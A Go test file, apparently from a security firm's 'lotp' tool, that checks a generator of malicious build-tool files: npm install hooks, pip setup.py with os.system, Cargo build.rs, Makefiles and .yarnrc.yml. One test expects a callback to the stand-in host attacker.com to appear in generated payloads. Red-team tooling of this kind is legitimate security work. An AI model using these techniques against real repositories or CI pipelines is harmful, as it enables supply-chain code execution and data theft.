// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package lotp

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestFindByFile(t *testing.T) {
	tests := []struct {
		filename string
		expected []string
	}{
		{"package.json", []string{"NPM"}},
		{"setup.py", []string{"pip"}},
		{"Cargo.toml", []string{"Cargo"}},
		{"Makefile", []string{"Make"}},
		{".yarnrc.yml", []string{"Yarn"}},
		{"nonexistent.xyz", nil},
	}

	for _, tt := range tests {
		t.Run(tt.filename, func(t *testing.T) {
			matches := FindByFile(tt.filename)
			if tt.expected == nil {
				assert.Empty(t, matches)
			} else {
				assert.NotEmpty(t, matches)
				for _, name := range tt.expected {
					found := false
					for _, m := range matches {
						if m.Name == name {
							found = true
							break
						}
					}
					assert.True(t, found, "Expected to find %s", name)
				}
			}
		})
	}
}

func TestFindByCommand(t *testing.T) {
	tests := []struct {
		command  string
		expected []string
	}{
		{"npm install", []string{"NPM"}},
		{"pip install -r requirements.txt", []string{"pip"}},
		{"cargo build", []string{"Cargo"}},
		{"make all", []string{"Make"}},
		{"nonexistent-cmd", nil},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			matches := FindByCommand(tt.command)
			if tt.expected == nil {
				assert.Empty(t, matches)
			} else {
				assert.NotEmpty(t, matches)
			}
		})
	}
}

func TestAllTechniques(t *testing.T) {
	techniques := AllTechniques()
	assert.GreaterOrEqual(t, len(techniques), 10) // We have at least 10 in catalog
}

func TestNPMPayload_Generate(t *testing.T) {
	payload := NewNPMPayload(PayloadOptions{
		Command: "whoami",
	})

	payloads := payload.Generate()
	require.NotEmpty(t, payloads)

	// Should have preinstall and postinstall variants
	var hasPreinstall, hasPostinstall bool
	for _, p := range payloads {
		assert.Equal(t, "npm", p.Technique)
		assert.Equal(t, "package.json", p.File)
		assert.Contains(t, p.Content, "whoami")

		if p.Properties["hook"] == "preinstall" {
			hasPreinstall = true
		}
		if p.Properties["hook"] == "postinstall" {
			hasPostinstall = true
		}
	}
	assert.True(t, hasPreinstall, "Should have preinstall hook")
	assert.True(t, hasPostinstall, "Should have postinstall hook")
}

func TestNPMPayload_WithCallback(t *testing.T) {
	payload := NewNPMPayload(PayloadOptions{
		CallbackURL: "https://attacker.com",
	})

	payloads := payload.Generate()
	require.NotEmpty(t, payloads)

	// Should contain callback URL
	found := false
	for _, p := range payloads {
		if strings.Contains(p.Content, "attacker.com") {
			found = true
			break
		}
	}
	assert.True(t, found, "Should include callback URL in payload")
}

func TestPipPayload_Generate(t *testing.T) {
	payload := NewPipPayload(PayloadOptions{
		Command: "id",
	})

	payloads := payload.Generate()
	require.NotEmpty(t, payloads)

	// Should have setup.py
	var hasSetupPy bool
	for _, p := range payloads {
		if p.File == "setup.py" {
			hasSetupPy = true
			assert.Contains(t, p.Content, "CustomInstall")
			assert.Contains(t, p.Content, "os.system")
		}
	}
	assert.True(t, hasSetupPy, "Should have setup.py payload")
}

func TestYarnPayload_Generate(t *testing.T) {
	payload := NewYarnPayload(PayloadOptions{
		Command: "id",
	})

	payloads := payload.Generate()
	require.NotEmpty(t, payloads)

	// Should have .yarnrc.yml
	var hasYarnrc bool
	for _, p := range payloads {
		if p.File == ".yarnrc.yml" {
			hasYarnrc = true
			assert.Contains(t, p.Content, "yarnPath")
		}
	}
	assert.True(t, hasYarnrc, "Should have .yarnrc.yml payload")
}

func TestCargoPayload_Generate(t *testing.T) {
	payload := NewCargoPayload(PayloadOptions{
		Command: "id",
	})

	payloads := payload.Generate()
	require.NotEmpty(t, payloads)

	// Should have build.rs
	var hasBuildRs bool
	for _, p := range payloads {
		if p.File == "build.rs" {
			hasBuildRs = true
			assert.Contains(t, p.Content, "Command::new")
		}
	}
	assert.True(t, hasBuildRs, "Should have build.rs payload")
}

func TestMakePayload_Generate(t *testing.T) {
	payload := NewMakePayload(PayloadOptions{
		Command: "id",
	})

	payloads := payload.Generate()
	require.NotEmpty(t, payloads)

	// Should have Makefile
	var hasMakefile bool
	for _, p := range payloads {
		if p.File == "Makefile" {
			hasMakefile = true
			assert.Contains(t, p.Content, "all:")
		}
	}
	assert.True(t, hasMakefile, "Should have Makefile payload")
}

func TestDetectAvailableVectors(t *testing.T) {
	files := []string{"package.json", "Makefile"}
	commands := []string{"npm install", "make"}

	techniques := DetectAvailableVectors(files, commands)

	assert.NotEmpty(t, techniques)

	var hasNPM, hasMake bool
	for _, tech := range techniques {
		if tech.Name == "NPM" {
			hasNPM = true
		}
		if tech.Name == "Make" {
			hasMake = true
		}
	}
	assert.True(t, hasNPM, "Should detect npm")
	assert.True(t, hasMake, "Should detect make")
}

func TestRecommendBestPayload(t *testing.T) {
	// npm is highest priority
	techniques := []Technique{
		Catalog["make"],
		Catalog["npm"],
	}

	opts := PayloadOptions{Command: "id"}
	payload := RecommendBestPayload(techniques, opts)

	require.NotNil(t, payload)
	assert.Equal(t, "npm", payload.Technique)
}

func TestNPMHooks(t *testing.T) {
	assert.Contains(t, NPMHooks, "preinstall")
	assert.Contains(t, NPMHooks, "postinstall")
	assert.Contains(t, NPMHooks, "prepare")
}

func TestMatchFile(t *testing.T) {
	tests := []struct {
		pattern  string
		filename string
		match    bool
	}{
		{"package.json", "package.json", true},
		{"*.go", "main.go", true},
		{"*.go", "test.py", false},
		{"Makefile", "Makefile", true},
		{"Makefile", "makefile", false}, // case sensitive
	}

	for _, tt := range tests {
		t.Run(tt.pattern+"/"+tt.filename, func(t *testing.T) {
			assert.Equal(t, tt.match, matchFile(tt.pattern, tt.filename))
		})
	}
}

func TestMatchCommand(t *testing.T) {
	tests := []struct {
		pattern string
		cmd     string
		match   bool
	}{
		{"npm install", "npm install", true},
		{"npm install", "npm install --save", true},
		{"npm install", "npm i", false}, // Not prefix
		{"make", "make all", true},
	}

	for _, tt := range tests {
		t.Run(tt.pattern+"/"+tt.cmd, func(t *testing.T) {
			assert.Equal(t, tt.match, matchCommand(tt.pattern, tt.cmd))
		})
	}
}

func TestNormalizeTechnique_VersionedActionRef(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"actions/setup-node@v4", "npm"},
		{"actions/setup-node@v3.1.0", "npm"},
		{"actions/setup-python@v5", "pip"},
		{"actions/setup-python@main", "pip"},
		{"actions/setup-node", "npm"},
		{"npm", "npm"},
		{"", ""},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			assert.Equal(t, tt.expected, NormalizeTechnique(tt.input))
		})
	}
}
